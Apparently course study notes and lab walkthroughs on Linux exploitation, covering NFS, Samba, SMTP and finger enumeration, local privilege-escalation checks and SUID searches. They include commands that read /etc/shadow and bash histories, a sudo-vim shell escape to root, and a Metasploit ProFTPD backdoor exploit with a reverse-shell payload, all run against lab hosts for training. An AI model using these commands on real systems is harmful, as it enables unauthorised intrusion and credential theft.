# Linux Exploitation

## Information Gathering

### Remote Enumeration - Study Guide

(03/72) Keep in mind that the information gathering and enumeration phases are considered the most important.

(05/72) OS fingerprinting.
`nmap -O --osscan-guess <TargetIP>`: where `--osscan-guess` enables aggressive operating system detection mode. 
`nmap -sT <TargetIP>`:
```
Nmap scan report for kali.localdomain (192.168.13.26)
Host is up (0.00082s latency).
Not shown: 996 closed ports
PORT STATE SERVICE
25/tcp open smtp
111/tcp open rpcbind ←
587/tcp open submission
2049/tcp open nfs ←
MAC Address: 00:0C:29:09:35:EE (VMware)
```
The open ports returned from a port scan can offer some insight as the OS, like Linux-based services.
Keep in mind that Windows-based honeypots can be used to masquerade as Linux hosts, and vice-versa.

(13/72) We will focus on several commonly discovered services which are considered "Low Hanging Fruits" due to their common occurrence and their common misconfigurations.

(14/72) *NFS* (Network File System) is an RPC-based file sharing protocol often found on Unix-like systems, usually used to provide access to shared resources.
`nmap -sT -sU -sV <TargetIP> -p 2049`: to identify NFS service running (UDP/TCP 2049 ports) on a target.
It relies on other services such as `mountd`. It should be directly queried via Portmapper (rpcbind) service.

Exports are the mechanism used by NFS in order to make entire directories available to other users over the network. Exports can be found locally in `/etc/exports` on a target host.
Usually administrators configure exports allowing any host/IP address to connect without authentication, and if we are lucky, also provide write-access. Ideally, administrators should explicitly define (whitelist) hosts/IP addresses allowed to connect to NFS servers.
Some NSE scripts we can use for NFS: `ls /usr/share/nmap/scripts | grep "nfs"`:
```
nfs-ls.nse
nfs-showmount.nse
nfs-statfs.nse
```
`nmap --script nfs-ls,nfs-showmount,nfs-statfs <TargetIP>`: to obtain access rights and available directories exports.
Alternatively, we can use: `showmount --exports <TargetIP>` to simply list the available exports.
From the outputs we can see that the exports can be accessable from anyone (`*`) or from specific IP addresses.
To attempt to mount available exports: `mkdir -p /mnt/home/<Username>/Desktop`, `mount -t nfs <TargetIP>:/home/<Username>/Desktop /mnt/home/<Username>/Desktop -o nolock`, `mount`: to confirm the mount.
`cd /mnt/home/<Username>/Desktop && ls -al`.

(28/72) *Portmapper* (rpcbind) is used to essentially map RPC services to their corresponding TCP/UDP ports on a system. It may offer insight about ports listening on a target system, so, querying it we can enumerate all related RPC-based services ports. Portmapper usually uses ports TCP/UDP 111 and in some cases TCP/UDP 32771.
`nmap --script rpc-bind,rpcinfo <TargetIP> -p 111`: to enumerate Portmapper and associated RPC services.
Alternatively, we can use `rpcinfo -p <TargetIP>`.
Note that we can also obtain which ports the system has open locally (bound to `localhost`).

(36/72) *Samba* is a Linux-based implementation of SMB Windows protocols. Depending on the configuration, enumerating it we can obtain a great bit of information. It uses the usual NetBIOS ports (137, 138, 139 TCP/UDP and TCP 445).
`nmap -sT -sU -sV <TargetIP> -p137,138,139,445 --open`: to trivially identify Samba services.

(41/72) *SMB shares enumeration*.
`nmap --script smb-enum-shares <TargetIP>`: to enumerate SMB shares, getting account access, Samba version, shares and access rights.
Alternatively, we can use `smbclient -L <TargetIP>` or `smbmap -H <TargetIP>`.

`smbclient \\\\<TargetIP>\\<SambaShare>`: to access to an identified share.
`mkdir /mnt/<LocalMountPoint>`, `mount -t cifs \\\\<TargetIP>\\<SambaShare> /mnt/<LocalMountPoint>`: to mount an identified share.

(49/72) *SMB users enumeration*.
`for user in $(cat /root/Desktop/users.txt); do rpcclient -U "" -N <TargetIP> \ --command='lookupnames $user'; done;`: a manual method to enumerate SMB users, where `-U ""` specifies anonymous/guest logon, `-N` specifies to use no passwords, `lookupnames` is a rpcclient ocoammnd.
Valid user returns `User: 1`, while non-existent user returns `NT_STATUS_NONE_MAPPED`.
*enum4linux* is a tool to automate the enumeration phase, able to extract: OS, users, password policies, group membership, shares, domain/workgroup.
`enum4linux -U <TargetIP>`: to enumerate SMB users.

We can also use the [*Statistically Likely Usernames*](https://github.com/insidetrust/statistically-likely-usernames) list.

(59/72) *SMTP users enumeration* using verbs enabled on the mail server (Sendmail, Postfix, Exim and Microsoft Exchange).
`nmap --script smtp-commands <TargetIP> -p 25`: to enumerate the enabled verbs. We are interested in `RCPT`, `VRFY`, `EXPN` verbs.
`smtp-user-enum -M <EnabledVerb> -u <Username> -t <TargetIP>`, `smtp-user-enum -M <EnabledVerb> -U <UsernamesList> -T <TargetIPsList>` for automated SMTP users enumeration.

### Local Enumeration - Study Guide

What we do once we obtained access to a Linux machine?
We can gather information about the network and the system.

(06/37) *Network information gathering*.
`ifconfig -a`: list network interfaces configuration.
`route -n`: to print the current network routes including the gateway.
`traceroute -n <TargetIP>`: know how many hops there are between a target machine.
`cat /etc/resolv.conf`: DNS server information.
`arp -en`: understand who we are communicating with through arp cache.
`netstat -auntp`: to know which machines we are connecting with, with which ports, and all the TCP/UDP established connections.
`ss -twurp`: another prospective on established connections, useful as an alternative to `netstat`.
`nmap -sT -p <PortRange> portquiz.net`: we can use this webserver to confirm we can connect to arbitrary ports outside our network (check outbound firewall rules).

(20/37) *System information gathering*.
`id`: current user information (user identificators and groups).
`uname -a`: OS information (OS name, hostname, kernel version, architecture type).
`grep $USER /etc/password`: current user information (name, home directory path, user shell path, user identificators and groups).
`lastlog`: most recent logins.
`w`: which user is currently logged on.
`last`: last logged on users.
`for user in $(cat /etc/passwd | cut -f 1 -d ":"); do id $user; done;`: all users, including UIDs and GIDs.
`cat /etc/passwd | cut -f 1,3,4 -d ":" | grep "0:0 | cut -f 1 -d ":" | awk '{print $1}'`: list all root (UID 0) accounts.
`cat /etc/shadow`: check readability of the shadow file (containing users accounts and passwords information).
`sudo -l`: which commands the user can execute with sudo and limitations.
`cat /etc/sudoers`: check readability of the sudoers file (containing the commands privileges configurations).
`cat /root/.bash_history`: to read the root user bash history file.
`find /home/* -name .bash_history*`: to read other users bash history files.
`cat /etc/issue`, `cat /etc/*-release`: Linux distribution information.
`sudo -l | grep "vim"`, `sudo -l | grep "vi"`, `sudo -l | grep "nmap"`: to check if the current user has specific root permissions to execute the respective tool.
`ls -al /root/`: check readability of the root home directory.
`echo $PATH`: current PATH environment variable (containing all directories the OS check to find executables).
`cat /etc/crontab && ls -al /etc/cron*`: list all cron jobs.
`find /etc/cron* -type f -perm -o+w -exec ls -l {} \;`: find world-writable (writable from all the users) cron jobs.
`ps auxwww`: list all running processes.
`ps -u $USER`: list all running (as current user) processes.
`ps -u root`: list all running (as root) processes.

*SUID files* are executable files on Unix and Unix-like systems that have the SUID bit set. When an SUID file is executed, it temporarily acquires the privileges of the file's owner instead of the user running it.
`find / -type f -perm -4000`: find SUID files.
`find / -type f -perm -4000 -uid 0`: find SUID files owned by root.
`find / -type f -perm -2000`: find GUID files.
`find / -type f -perm -2`: find world-writable (writable from all the users) files.
`ls -al /etc/*.conf`: list configuration files.
`grep "pass* /etc/*.conf"`: find configuration files containing the string pass.
`lsof -n`: list open files.
`dpkg -l`: list installed packages (Debian).
`sudo -V`, `httpd -v`, `apache2 -v`, `mysql -v`, `sendmail -d0.1`: common software versions.
`ps aux | awk '{print $11} | xargs -r ls -la 2> /dev/null | awk '!x[$0]++'`: to get the binaries paths associated to the current running processes.

(29/37) Information Gathering Linux tools.
*LinEnum* is an automated information gathering tool.
*LinuxPrivChecker* is a tool for checking for privilege escalation methods.
*Unix-privesc-check* is a tool for finding common misconfigurations to help us elevate our privileges.
*mimipenguin* is a tool for dumping the logon password for the current logged user.

### Information Gathering - Video

*Finger*.
Although the finger protocol (port 79 TCP) dates back to the early days of UNIX, it is still commonly encountered today during internal penetration testing engagements, particularly within financial institutions, critical infrastructure organizations, and other environments that heavily rely on Linux-based platforms for their routine tasks.

`nmap -sT 192.168.1.2 -p79`: to check if finger service is listening.
`nmap --script finger 192.168.1.2 -p79`: to enumerate basic Linux users.

`for user in $(cat /usr/share/metasploit-framework/data/wordlists/unix_users.txt); do finger $user@<TargetIP>; done; > /root/Desktop/valid_users.txt`, `cat /root/Desktop/valid_users.txt | less`: to further enumerate for more users.

*LinuxPrivChecker*.
This tool will search the system for common misconfigurations, permission issues, SUID root executables, world-writable files and several other configuration issues which can lead to privilege escalation on a Linux system.

`python --version`: to check that Python is installed on the system.
`wget -q https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py`, `python linuxprivchecker.py > /root/Desktop/enum_output.txt`, `cat /root/Desktop/enum_output.txt | less`. 

It identified an interesting entry in the sudoers file:
```
user    ALL=(root)      NOPASSWD:       /usr/bin/apt edit-source ../*
```

`sudo /usr/bin/apt edit-source ../../../../../tmp/foo`: where `../../../../../tmp/foo` does not exist.
`select /usr/bin/vim.basic`, `:!sh`: since we are able to execute `/usr/bin/apt edit-source` as root to a file of our choosing using a long path name, and then choosing vim as our editor, our shell escape command was also run as root and has given us a root shell.

### Linux Exploitation: Lab 1 - Remote Enumeration - Lab

This exercise will help you understand how to perform enumeration on the remote linux systems to find vulnerable services, valid users and enumerate the benefits of finding juicy information.

In this lab environment, the user will access a Kali GUI instance. A vulnerable application can be accessed using the tools installed on Kali on:
- http://demo.ine.local
- http://demo2.ine.local
- http://demo3.ine.local
- http://demo4.ine.local

Dictionaries to use:
- `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- `/usr/share/metasploit-framework/data/wordlists/unix_users.txt`

The best tools for this lab are:
- Nmap
- SMTP-user-enum
- finger-user-enum
- rpcclient
- enum4linux
- Bash Shell
- smbmap
- Metasploit Framework

---

**Step 1**: *OS fingerprinting*.

`echo -e "demo.ine.local\ndemo2.ine.local\ndemo3.ine.local\ndemo4.ine.local" > /root/Desktop/hosts.txt`.
`cat /root/Desktop/hosts.txt`:
```
demo.ine.local
demo2.ine.local
demo3.ine.local
demo4.ine.local
```

`nmap -O --osscan-guess -iL /root/Desktop/hosts.txt`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-21 19:35 IST
Nmap scan report for demo.ine.local (192.114.85.3) ←
Host is up (0.000059s latency).
rDNS record for 192.114.85.3: target-1
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
25/tcp open  smtp
MAC Address: 02:42:C0:72:55:03 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6 ←
Network Distance: 1 hop

Nmap scan report for demo2.ine.local (192.114.85.4) ←
Host is up (0.000019s latency).
rDNS record for 192.114.85.4: target-2
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:72:55:04 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6 ←
Network Distance: 1 hop

Nmap scan report for demo3.ine.local (192.114.85.5)
Host is up (0.000018s latency).
rDNS record for 192.114.85.5: target-3
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
79/tcp open  finger
MAC Address: 02:42:C0:72:55:05 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6 ←
Network Distance: 1 hop

Nmap scan report for demo4.ine.local (192.114.85.6)
Host is up (0.000018s latency).
rDNS record for 192.114.85.6: target-4
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:C0:72:55:06 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6 ←
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 1.97 seconds
```

**Step 2**: *Port scanning*.

`nmap -sT -sU -sV -iL /root/Desktop/hosts.txt --open`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-21 20:35 IST
Nmap scan report for demo.ine.local (192.114.85.3)
Host is up (0.00035s latency).
rDNS record for 192.114.85.3: target-1
Not shown: 1000 closed udp ports (port-unreach), 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd ←
MAC Address: 02:42:C0:72:55:03 (Unknown)
Service Info: Host: demo.ine.local

Nmap scan report for demo2.ine.local (192.114.85.4)
Host is up (0.00055s latency).
rDNS record for 192.114.85.4: target-2
Not shown: 998 closed udp ports (port-unreach), 998 closed tcp ports (conn-refused)
PORT    STATE         SERVICE     VERSION
139/tcp open          netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS) ←
445/tcp open          netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS) ←
137/udp open          netbios-ns  Samba nmbd netbios-ns (workgroup: RECONLABS) ←
138/udp open|filtered netbios-dgm
MAC Address: 02:42:C0:72:55:04 (Unknown)
Service Info: Host: SAMBA-RECON

Nmap scan report for demo3.ine.local (192.114.85.5)
Host is up (0.00053s latency).
rDNS record for 192.114.85.5: target-3
Not shown: 1000 closed udp ports (port-unreach), 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
79/tcp open  finger  Linux fingerd ←
MAC Address: 02:42:C0:72:55:05 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for demo4.ine.local (192.114.85.6)
Host is up (0.00033s latency).
rDNS record for 192.114.85.6: target-4
Not shown: 1000 closed udp ports (port-unreach), 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c ←
MAC Address: 02:42:C0:72:55:06 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 1182.78 seconds
```

Host				Open Port
`demo.ine.local` 	25/tcp open smtp
`demo2.ine.local` 	137/udp open netbios-ns, 139,445/tcp open netbios-ssn
`demo3.ine.local` 	79/tcp open finger
`demo4.ine.local` 	21/tcp open ftp

**Step 3**: *SMTP Users*.

`nmap --script smtp-commands demo.ine.local -p25`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-21 19:49 IST
Nmap scan report for demo.ine.local (192.114.85.3)
Host is up (0.000068s latency).
rDNS record for 192.114.85.3: target-1

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: demo.ine.local, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8 ←
MAC Address: 02:42:C0:72:55:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

`smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/common_users.txt -t demo.ine.local`:
```
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/metasploit-framework/data/wordlists/common_users.txt
Target count ............. 1
Username count ........... 8
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Feb 21 19:50:33 2024 #########
demo.ine.local: administrator exists
demo.ine.local: sysadmin exists
demo.ine.local: demo exists
demo.ine.local: rooty exists
demo.ine.local: anon exists
demo.ine.local: auditor exists
demo.ine.local: diag exists
######## Scan completed at Wed Feb 21 19:50:33 2024 #########
7 results.

8 queries in 1 seconds (8.0 queries / sec)
```

`smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t demo.ine.local`:
```
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/metasploit-framework/data/wordlists/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Feb 21 19:51:11 2024 #########
demo.ine.local: administrator exists
demo.ine.local: _apt exists
demo.ine.local: anon exists
demo.ine.local: auditor exists
demo.ine.local: backup exists
demo.ine.local: bin exists
demo.ine.local: daemon exists
demo.ine.local: demo exists
demo.ine.local: diag exists
demo.ine.local: games exists
demo.ine.local: gnats exists
demo.ine.local: irc exists
demo.ine.local: list exists
demo.ine.local: lp exists
demo.ine.local: mail exists
demo.ine.local: man exists
demo.ine.local: news exists
demo.ine.local: nobody exists
demo.ine.local: postfix exists
demo.ine.local: proxy exists
demo.ine.local: postmaster exists
demo.ine.local: ROOT exists
demo.ine.local: root exists
demo.ine.local: rooty exists
demo.ine.local: sync exists
demo.ine.local: sysadmin exists
demo.ine.local: sys exists
demo.ine.local: uucp exists
demo.ine.local: www-data exists
######## Scan completed at Wed Feb 21 19:51:11 2024 #########
29 results.

168 queries in 1 seconds (168.0 queries / sec)
```

`rpcclient demo2.ine.local`:
```
Enter WORKGROUP\root's password: 
Bad SMB2 signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 02 00 B5 F1 8B 2C A0 04   F9 9C CF 7C 0D 43 CC 64   .....,.. ...|.C.d
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

`rpcclient demo2.ine.local -U ""`:
```
Enter WORKGROUP\'s password: 
rpcclient $> enumdomusers ←
user:[john] rid:[0x3e8]
user:[elie] rid:[0x3ea]
user:[aisha] rid:[0x3ec]
user:[shawn] rid:[0x3e9]
user:[emma] rid:[0x3eb]
user:[admin] rid:[0x3ed]
rpcclient $> enumdomgroups ←
group:[Maintainer] rid:[0x3ee]
group:[Reserved] rid:[0x3ef]
rpcclient $> queryuser john ←
        User Name   :   john
        Full Name   :
        Home Drive  :   \\samba-recon\john
        Dir Drive   :
        Profile Path:   \\samba-recon\john\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Thu, 01 Jan 1970 05:30:00 IST
        Logoff Time              :      Wed, 06 Feb 2036 20:36:39 IST
        Kickoff Time             :      Wed, 06 Feb 2036 20:36:39 IST
        Password last set Time   :      Tue, 27 Nov 2018 19:06:12 IST
        Password can change Time :      Tue, 27 Nov 2018 19:06:12 IST
        Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST
        unknown_2[0..31]...
        user_rid :      0x3e8
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```

**Step 4**: *SMB Shares*.

`nmap --script smb-enum-shares demo2.ine.local`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-21 19:57 IST
Nmap scan report for demo2.ine.local (192.114.85.4)
Host is up (0.0000090s latency).
rDNS record for 192.114.85.4: target-2
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:72:55:04 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.114.85.4\IPC$: ←
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (samba.recon.lab)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.114.85.4\aisha: ←
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\aisha
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.114.85.4\emma: ←
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\emma
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.114.85.4\everyone: ←
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\everyone
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.114.85.4\john: ←
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\john
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.114.85.4\public: ←
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\public
|     Anonymous access: READ/WRITE ←
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
```

`smbclient -L demo2.ine.local`:
```
Enter WORKGROUP\root's password: ←

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk ←      
        john            Disk ←    
        aisha           Disk ←     
        emma            Disk ←     
        everyone        Disk ←     
        IPC$            IPC  ←    IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON
```

`smbmap -H demo2.ine.local`:
```
[+] Guest session       IP: demo2.ine.local:445 Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        public                                                  READ, WRITE ←
        john                                                    NO ACCESS ←
        aisha                                                   NO ACCESS ←
        emma                                                    NO ACCESS ←
        everyone                                                NO ACCESS ←
        IPC$                                                    NO ACCESS ←     IPC Service (samba.recon.lab)
```

`smbclient \\\\demo2.ine.local.\\public`:
```
Enter WORKGROUP\root's password: ←
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 21 20:02:02 2024
  ..                                  D        0  Tue Nov 27 19:06:13 2018
  secret                              D        0  Tue Nov 27 19:06:13 2018
  dev                                 D        0  Tue Nov 27 19:06:13 2018

                1981084628 blocks of size 1024. 182772640 blocks available
smb: \> cd secret
smb: \secret\> ls
  .                                   D        0  Tue Nov 27 19:06:13 2018
  ..                                  D        0  Wed Feb 21 20:02:02 2024
  flag                                N       33  Tue Nov 27 19:06:13 2018

                1981084628 blocks of size 1024. 182772628 blocks available
smb: \secret\> get flag /root/Desktop/flag ←
getting file \secret\flag of size 33 as /root/Desktop/flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
smb: \secret\> exit
```

`cat /root/Desktop/flag`:
```
03ddb97933e716f5057a18632badb3b4
```

**Step 5**: *SMB Users*.

`enum4linux -U demo2.ine.local`:
```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 21 20:05:35 2024

 ========================== 
|    Target Information    |
 ========================== 
Target ........... demo2.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ======================================================= 
|    Enumerating Workgroup/Domain on demo2.ine.local    |
 ======================================================= 
[+] Got domain/workgroup name: RECONLABS

 ======================================== 
|    Session Check on demo2.ine.local    |
 ======================================== 
[+] Server demo2.ine.local allows sessions using username '', password '' ←

 ============================================== 
|    Getting domain SID for demo2.ine.local    |
 ============================================== 
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ================================ 
|    Users on demo2.ine.local    |
 ================================ 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: john     Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elie     Name:   Desc: 
index: 0x3 RID: 0x3ec acb: 0x00000010 Account: aisha    Name:   Desc: 
index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: shawn    Name:   Desc: 
index: 0x5 RID: 0x3eb acb: 0x00000010 Account: emma     Name:   Desc: 
index: 0x6 RID: 0x3ed acb: 0x00000010 Account: admin    Name:   Desc: 

user:[john] rid:[0x3e8] ←
user:[elie] rid:[0x3ea] ←
user:[aisha] rid:[0x3ec] ←
user:[shawn] rid:[0x3e9] ←
user:[emma] rid:[0x3eb] ←
user:[admin] rid:[0x3ed] ←
enum4linux complete on Wed Feb 21 20:05:35 2024
```

**Step 6**: *Finger Enumeration*.

*Finger* is a simple network protocol for the exchange of human-oriented status and user information. The finger daemon runs on TCP port 79. The client will (in the case of remote hosts) open a connection to port 79. An RUIP (Remote User Information Program) is started on the remote end of the connection to process the request. The local host sends the RUIP one line query based upon the Finger query specification, and waits for the RUIP to respond. The RUIP receives and processes the query, returns an answer, then initiates the close of the connection. The local host receives the answer and the close signal, then proceeds to close its end of the connection.

We all know that `root` is a built-in account on all Linux systems.
Let's use the finger command on the target to get `root` user information.

`finger root@demo3.ine.local`:
```
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

`msfconsole -q`, `search finger users`, `use auxiliary/scanner/finger/finger_users`, `show options`, `set RHOSTS demo3.ine.local`, `set USERS_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt`, `exploit`:
```
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: admin
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: administrator
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: _apt
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: backup
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: bin
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: daemon
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: dbadmin
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: diag
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: games
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: gnats
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: gopher
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: irc
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: list
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: lp
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: mail
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: man
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: news
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: nobody
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: proxy
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: systemd-bus-proxy
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: root
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: saned
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: sync
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: sys
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: systemd-network
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: systemd-resolve
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: systemd-timesync
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: udadmin
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: uucp
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: webmaster
[+] 192.114.85.5:79       - 192.114.85.5:79 - Found user: www-data
[+] 192.114.85.5:79       - 192.114.85.5:79 Users found: _apt, admin, administrator, backup, bin, daemon, dbadmin, diag, games, gnats, gopher, irc, list, lp, mail, man, news, nobody, proxy, root, saned, sync, sys, systemd-bus-proxy, systemd-network, systemd-resolve, systemd-timesync, udadmin, uucp, webmaster, www-data
[*] demo3.ine.local:79    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Step 7**.

`ip addr | grep "inet"`:
```
inet 127.0.0.1/8 scope host lo
inet 10.1.0.17/16 brd 10.1.255.255 scope global eth0
inet 192.114.85.2/24 brd 192.114.85.255 scope global eth1 ←
```

`search proftpd`, `use exploit/unix/ftp/proftpd_133c_backdoor`, `show options`, `set PAYLOAD /cmd/unix/reverse_perl`, `set RHOSTS demo4.ine.local`, `set LHOST 192.114.85.2`, `exploit`.

`id`:
```
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```

---

### Linux Exploitation: Lab 2 - Local Enumeration - Lab

This exercise will help you understand how to perform local enumeration to find misconfigurations that allow an attacker to gain root privileges.

The user will access an Ubuntu instance as a `student` user. We will assume that we have compromised a machine and gained regular user access (`student`).
We need to conduct local enumeration and obtain root access to the machine.

Objective: Find the SUID executables and vulnerable services to gain the root privileges.

The best tools for this lab are:
- Bash Shell
- LinEnum

---

**Step 1A**.

`id`:
```
uid=1001(student) gid=1001(student) groups=1001(student)
```

Let's find all SUID executables.

`find / -type f -perm -4000 2> /dev/null`:
```
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/find ←
/snap/snapd/14066/usr/lib/snapd/snap-confine
/snap/core18/2253/bin/mount
/snap/core18/2253/bin/ping
/snap/core18/2253/bin/su
/snap/core18/2253/bin/umount
/snap/core18/2253/usr/bin/chfn
/snap/core18/2253/usr/bin/chsh
/snap/core18/2253/usr/bin/gpasswd
/snap/core18/2253/usr/bin/newgrp
/snap/core18/2253/usr/bin/passwd
/snap/core18/2253/usr/bin/sudo
/snap/core18/2253/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2253/usr/lib/openssh/ssh-keysign
```

We can always refer to the [GTFOBins](https://gtfobins.github.io/) for suid-based privilege escalation.

